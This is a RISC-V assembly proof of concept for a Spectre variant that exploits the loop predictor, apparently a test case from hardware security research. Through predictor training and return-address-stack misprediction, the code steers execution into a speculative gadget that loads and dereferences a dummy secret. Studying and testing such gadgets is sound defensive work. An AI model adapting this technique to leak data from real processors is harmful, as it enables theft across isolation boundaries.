#------------------------------------------------------------------------------
# LoopPredictor Spectre variant.
#
# The victim enters an infinite loop, which is mispredicted at each iteration
# due to the RAS being empty. This causes the branch right before the end
# of the loop to also be mispredicted, even if it was never trained.
# The mispredicted branch will jump to a dummy speculative gadget that
# loads the secret (0xcacacfedeadbeef) into the core's Register File.
#------------------------------------------------------------------------------

.text
init:
    # Make sure that all predictors are initialized.
    # The BIM takes 2048 cycles to initialize all entries to '2' (weakly taken).
    .rep 128
    fence
    .endr

    # Load legit data (preloads the secret in D-Cache).
    li a0, 0x80004004
    lw t0, 0(a0)

    # Train the function to the correct prediction (strongly not taken).
    # This simulates system noise, so that we are not in a cold predictor state.
    li a0, 0x80004004
    call target
    call target
    call target
    li s0, 0x100
    li s1, 0
    fence

attacker:
    # Call the victim, which will enter an infinite loop of mispredictions.
    li a0,  0x80004000
    call victim
    fence

# padding:
.rep 64
unimp
.endr

.align 4
victim:
    # This makes sure that the ret returns here and is consistently mispredicted.
    auipc ra, 0

    .align 4
    target:
    li t1, 1
    li t0, 2

    # Slow down branch.
    mul t0, t0, t1
    mul t0, t0, t1
    mul t0, t0, t1
    mul t0, t0, t1
    mul t0, t0, t1
    mul t0, t0, t1
    mul t0, t0, t1
    mul t0, t0, t1
    # mul t0, t0, t1

    # This branch is _never_ executed architecturally and is not in control
    # of the attacker.
    .align 4
    beqz t0, speculative  # <---- MISPREDICTED after 8 times

    # This instruction has to be mispredicted 7 consecutive times, so that the loop
    # predictor infers a loop
    ret

# padding:
.rep 64
unimp
.endr

# ----------- Speculative load.
speculative:
ld t4, 0(a0)            # <---- Secret load
ld t4, 0(t4)
ret

# padding:
.rep 128
unimp
.endr

